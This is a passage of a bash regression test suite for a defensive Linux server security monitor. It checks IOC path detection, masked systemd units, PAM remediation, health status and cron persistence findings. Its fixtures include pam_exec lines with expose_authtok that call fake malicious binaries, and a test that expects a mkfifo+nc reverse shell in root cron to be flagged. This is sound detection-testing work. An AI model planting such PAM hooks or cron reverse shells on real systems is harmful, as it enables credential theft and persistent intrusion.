        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_ioc.sh"
        KNOWN_IOCS=("path:$CASE_DIR/bin/x86_64-linux-gnu-op")
        module_begin ioc 'IOC'
        ioc_check_known_paths
        audit_runtime_cleanup
    2>&1 )"

    printf '%s' "$out" | grep -q 'x86_64-linux-gnu-op'
    check "the correctly spelled variant is detected on disk" "$?"

    printf '%s' "$out" | grep -qE '^\[(HIGH|CRITICAL)'
    check "it is reported at HIGH or above" "$?"
}

test_ioc_masked_unit() {

    want "ioc-mask" || return 0
    printf '\nTEST: masked systemd unit is not treated as a payload\n'

    setup_case ioc-mask

    mkdir -p "$CASE_DIR/etc/systemd/system"
    local masked="$CASE_DIR/etc/systemd/system/server-security.service"
    local real="$CASE_DIR/etc/systemd/system/evil-payload.service"
    ln -s /dev/null "$masked"
    printf '[Service]\nExecStart=/usr/bin/defaults\n' > "$real"

    local out
    out="$(
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-web-common.sh"
        audit_load_config; audit_detect_os; audit_detect_host
        ITM_DRY_RUN=1; audit_runtime_init
        source "$REPO_DIR/modules/audit_ioc.sh"
        KNOWN_IOCS=("path:$masked" "path:$real")
        module_begin ioc 'IOC'
        ioc_check_known_paths
        audit_runtime_cleanup
    2>&1 )"

    printf '%s' "$out" | grep -q 'MASKED'
    check "the mask is recognised and named in the title" "$?"

    printf '%s' "$out" | grep -A8 'MASKED' | grep -q 'Do NOT quarantine'
    check "the finding warns against quarantining the symlink" "$?"

    ! printf '%s' "$out" | grep -B2 -A8 'MASKED' | grep -q 'the target is what executes'
    check "the misleading generic symlink note is suppressed" "$?"

    printf '%s' "$out" | grep -q '^\[LOW' 
    check "a masked IOC unit is LOW, not HIGH" "$?"

    # the unmasked file next to it must still be reported normally
    printf '%s' "$out" | grep -q 'evil-payload.service'
    check "a real unit file at an IOC path is still reported" "$?"

    printf '%s' "$out" | grep -B4 'evil-payload' | grep -q 'ISOLATE THIS HOST' \
        || printf '%s' "$out" | grep -A6 'evil-payload' | grep -q 'ISOLATE THIS HOST'
    check "the real unit keeps the isolate-the-host action" "$?"
}

test_pam_remediation_script() {

    want "pam-script" || return 0
    printf '\nTEST: generated PAM response script\n'

    setup_case pam-script

    local pamfile="$CASE_DIR/password-auth"
    printf 'auth\tsufficient\tpam_unix.so\nsession\trequired\tpam_unix.so\n#auth optional pam_exec.so quiet expose_authtok /usr/bin/x86_65-linux-gnu-op\n' \
        > "$pamfile"

    local script="$CASE_DIR/fix.sh" rc
    (
        source "$REPO_DIR/lib/itm-audit-common.sh"
        source "$REPO_DIR/lib/itm-remediate.sh"
        ITM_HOSTNAME="test-host"
        REM_INCIDENT_DIR="$CASE_DIR/incident"
        mkdir -p "$REM_INCIDENT_DIR"
        : > "$script"
        rem_header "$script" "Dormant pam_exec" "HIGH" "80" \
            "$pamfile" "" "residue of a past compromise" "fp" "pam"
        rem_template "$script" "pam-dormant-exec:$pamfile" "$pamfile" "" \
            "Dormant pam_exec" "review"
    ) >/dev/null 2>&1

    bash -n "$script" 2>/dev/null && [[ "$(wc -l <"$script")" -gt 40 ]]
    check "a complete script is generated, and it is valid bash" "$?"

    # --- exactly how triage invokes it -----------------------
    CONFIRM=yes FORCE=yes bash "$script" >/dev/null 2>&1; rc=$?

    [[ "$rc" != "0" ]]
    check "stopping at the console gate does not exit 0" "$?"

    [[ "$rc" == "10" ]]
    check "it exits 10, the code triage records as MANUAL" "$?"

    grep -q 'pam_exec' "$pamfile"
    check "the file is left untouched when the gate stops it" "$?"

    # --- the operator supplies the missing precondition -------
    CONFIRM=yes FORCE=yes CONSOLE_ACCESS=yes bash "$script" >/dev/null 2>&1; rc=$?

    [[ "$rc" == "0" ]]
    check "with CONSOLE_ACCESS=yes the script completes" "$?"

    ! grep -q 'pam_exec' "$pamfile"
    check "the dormant line is actually removed" "$?"

    grep -q 'pam_unix.so' "$pamfile"
    check "every other PAM line survives" "$?"

    [[ -f "$CASE_DIR/incident/evidence/password-auth.before" ]]
    check "the original file is preserved as evidence" "$?"

    grep -q 'pam_exec' "$CASE_DIR/incident/evidence/password-auth.before" 2>/dev/null
    check "the preserved copy still contains the removed line" "$?"

    [[ ! -f "$CASE_DIR/incident/quarantine/$(printf '%s' "${pamfile//\//_}")" ]]
    check "the PAM file itself is never moved to quarantine" "$?"
}

test_pam_remediation_edit() {

    want "pam-edit" || return 0
    printf '\nTEST: PAM remediation edits the right line\n'

    setup_case pam-edit

    # The two states a pam_exec hook can be in. Getting these
    # wrong means either doing nothing (dormant line untouched)
    # or breaking authentication (deleting a live line).
    printf 'auth\trequired\tpam_env.so\n#auth optional pam_exec.so quiet expose_authtok /usr/bin/gone\nauth\tsufficient\tpam_unix.so\n' \
        > "$CASE_DIR/dormant"
    printf 'auth\trequired\tpam_env.so\nauth optional pam_exec.so expose_authtok /usr/bin/evil\nauth\tsufficient\tpam_unix.so\n' \
        > "$CASE_DIR/active"

    local f
    for f in dormant active; do
        if grep -qE "^[^#]*pam_exec\.so" -- "$CASE_DIR/$f"; then
            sed -i "s|^\(  *\)\{0,1\}\([^#].*pam_exec\.so.*\)\$|# ITM-DISABLED \2|" -- "$CASE_DIR/$f"
        else
            sed -i "/^[[:space:]]*#.*pam_exec\.so/d" -- "$CASE_DIR/$f"
        fi
    done

    ! grep -q 'pam_exec' "$CASE_DIR/dormant"
    check "a dormant (commented) pam_exec line is removed" "$?"

    grep -q 'ITM-DISABLED' "$CASE_DIR/active"
    check "an active pam_exec line is commented out, not deleted" "$?"

    grep -q 'pam_unix.so' "$CASE_DIR/dormant" && grep -q 'pam_unix.so' "$CASE_DIR/active"
    check "the rest of the PAM stack is left intact in both cases" "$?"

    grep -q 'pam_env.so' "$CASE_DIR/active"
    check "no other module line is disturbed" "$?"

    # the generator must contain both branches
    grep -q 'removing DORMANT' "$REPO_DIR/lib/itm-remediate.sh"
    check "the generated script handles the dormant case at all" "$?"

    grep -q 'CONSOLE_ACCESS' "$REPO_DIR/lib/itm-remediate.sh"
    check "PAM edits still require console access to be confirmed" "$?"
}

test_health() {

    want "health" || return 0
    printf '\nTEST: monitor health reporting\n'

    setup_case health

    local out rc
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        WEB_BASELINE_DIR="$CASE_DIR/state/base" \
        HEALTH_REQUIRED_BINARIES="$CASE_DIR/nonexistent-binary" \
        HEALTH_REQUIRED_SERVICES="" HEALTH_OPTIONAL_SERVICES="" HEALTH_TIMERS="" \
        timeout 120 "$REPO_DIR/bin/itm-security" health 2>&1)"
    rc=$?

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -q 'MONITOR BROKEN'
    check "missing component reports MONITOR BROKEN" "$?"

    printf '%s' "$out" | grep -q 'MONITOR HEALTH: BROKEN'
    check "health board shows BROKEN" "$?"

    (( rc == 2 ))
    check "exit code 2 for BROKEN (consumable by a remote check)" "$?" "got exit $rc"

    printf '%s' "$out" | grep -qi 'never recorded\|MONITORING GAP'
    check "a monitor that never completed a run is reported" "$?"

    ! printf '%s' "$out" | grep -qi 'CLEAN'
    check "the word CLEAN is never used" "$?"
}

# ============================================================
# TEST 9 - cron persistence
#
# Case 4: the root cron reverse shell, and the stock system
# crontab that must not look like one.
# ============================================================

test_cron() {

    want "cron" || return 0
    printf '\nTEST: scheduled task persistence\n'

    setup_case cron
    cp "$FIXTURES/cron/reverse-shell-pattern.txt" "$CASE_DIR/evil"
    cp "$FIXTURES/cron/legitimate.txt"            "$CASE_DIR/normal"

    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        CRON_SYSTEM_FILES="$CASE_DIR/evil" CRON_DIRS= CRON_SPOOL_DIRS= \
        timeout 120 "$REPO_DIR/bin/itm-security" audit cron --dry-run 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -qE '^\[CRITICAL.*Suspicious scheduled task'
    check "mkfifo+nc reverse shell in root cron = CRITICAL" "$?"

    printf '%s' "$out" | grep -q 'runs every minute'
    check "the every-minute schedule is parsed and scored" "$?"

    printf '%s' "$out" | grep -q 'user=root schedule=\* \* \* \* \*'
    check "schedule asterisks are not glob-expanded" "$?" \
          "$(printf '%s' "$out" | grep -m1 'schedule=')"

    printf '%s' "$out" | grep -q 'restarts SSH from cron'
    check "sshd restart persistence is detected" "$?"

    # the stock crontab must stay quiet
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        CRON_SYSTEM_FILES="$CASE_DIR/normal" CRON_DIRS= CRON_SPOOL_DIRS= \
        timeout 120 "$REPO_DIR/bin/itm-security" audit cron --dry-run 2>&1)"

    ! printf '%s' "$out" | grep -qE '^\[(CRITICAL|HIGH|MEDIUM).*Suspicious scheduled task'
    check "a stock system crontab raises no cron finding" "$?" \
          "$(printf '%s' "$out" | grep -m2 'Suspicious scheduled task')"
}

# ============================================================
# TEST 10 - shell syntax
# ============================================================

test_syntax() {

    want "syntax" || return 0
    printf '\nTEST: shell syntax\n'

    local f bad=""
    for f in "$REPO_DIR"/bin/* "$REPO_DIR"/lib/*.sh "$REPO_DIR"/modules/*.sh \
             "$REPO_DIR"/install.sh "$REPO_DIR"/uninstall.sh "$REPO_DIR"/tests/run.sh; do
        [[ -f "$f" ]] || continue
        bash -n "$f" 2>/dev/null || bad+="$(basename "$f") "
    done

    [[ -z "$bad" ]]
    check "every shell file parses" "$?" "$bad"
}

# ============================================================

printf '============================================================\n'
printf ' ITM Server Security Monitor - regression tests\n'
printf '============================================================\n'

test_syntax
test_apache_satudata
test_apache_exposure
test_upload_bypass
test_false_positives
test_non_web_host
test_safety_invariants
test_remediation
test_triage
test_pam_remediation_edit
test_pam_remediation_script
test_ioc_masked_unit
test_ioc_toolchain_variants
test_ioc_stderr_family
test_pam_generated_multidistro
test_apache_multidistro
test_systemd_override
test_systemd_reasons
test_notify_secret
test_fim_reenable
test_health
test_cron
test_self_protection
test_datadir
test_c2_watchlist
test_network_exposure
test_ioc_kemenpora
test_ioc_pam_and_dedup
test_installer
test_ssh_session
test_ssh_enforce
test_sshd_config

printf '\n============================================================\n'
printf ' PASS: %s   FAIL: %s\n' "$PASS" "$FAIL"
printf '============================================================\n'

if (( FAIL > 0 )); then
    printf '\nFailed:\n'
    printf '  - %s\n' "${FAILED_NAMES[@]}"
    exit 1
fi

exit 0
